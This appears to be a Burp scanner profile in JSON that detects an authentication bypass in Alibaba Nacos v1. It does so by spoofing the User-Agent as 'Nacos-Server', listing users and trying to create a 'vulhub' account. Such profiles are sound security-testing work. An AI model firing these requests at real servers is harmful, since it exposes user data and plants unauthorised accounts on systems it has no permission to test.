[
  {
    "ProfileName": "Alibaba-Nacos-v1-authbypass",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@weujieytt",
    "Payloads": [
      "true,/nacos/v1/auth/users?pageNo\u003d1\u0026pageSize\u003d9",
      "true,/nacos/v1/auth/users/?pageNo\u003d1\u0026pageSize\u003d999",
      "true,/nacos/v1/auth/users?username\u003dvulhub\u0026password\u003dvulhub"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,{\"username\":\"",
      "true,Or,vulhub",
      "true,Or,pagesAvailable",
      "true,Or,\"totalCount\"",
      "true,Or,caused: Required int parameter \u0027pageNo\u0027 is not present"
    ],
    "Tags": [
      "All",
      "Unauthorized"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": true,
    "ContentType": "application/json",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": true,
    "ResponseCode": "200",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 1,
    "MaxRedir": 0,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Alibaba-Nacos-v1-authbypass",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "\u003c/br\u003ePAYLOAD: \u003cpayload\u003e\u003cbr/\u003e\n\u003cbr\u003e\n-GREP:\u003cgrep\u003e\n\u003c/br\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [
      {
        "type": "Request",
        "match": "User-Agent\\:\\s(.*)",
        "replace": "User-Agent: Nacos-Server",
        "regex": "Regex"
      }
    ],
    "VariationAttributes": [],
    "InsertionPointType": [
      65,
      64
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 2
  }
]